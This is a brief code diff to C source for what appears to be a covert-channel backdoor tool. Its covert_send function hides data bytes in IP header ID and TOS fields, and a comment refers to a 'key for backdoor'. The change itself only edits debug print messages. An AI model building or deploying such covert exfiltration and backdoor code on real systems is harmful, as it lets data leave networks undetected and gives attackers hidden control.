@@ -40,7 +40,7 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
 
     if(covert_channel == 1) {
         packet.ip.id = data[0];
-        printf("%c", data[0]);
+        printf("sending: %c\n", data[0]);
         packet.ip.tos = 0;
     } else {
         //key for backdoor
@@ -120,7 +120,7 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
     //if((bytes_sent = send(sending_socket, &packet, 40, 0, (struct sockaddr *)&sin, sizeof(sin))) < 0) {
         perror("sendto");
     }
-    printf("Sending Data(%d)\n", bytes_sent);
+    printf("Sending Data(%d)\n\n\n", bytes_sent);
 }
 
 char covert_recv(char *sip, unsigned short sport, int ipid, int seq, int ack, int tos) {
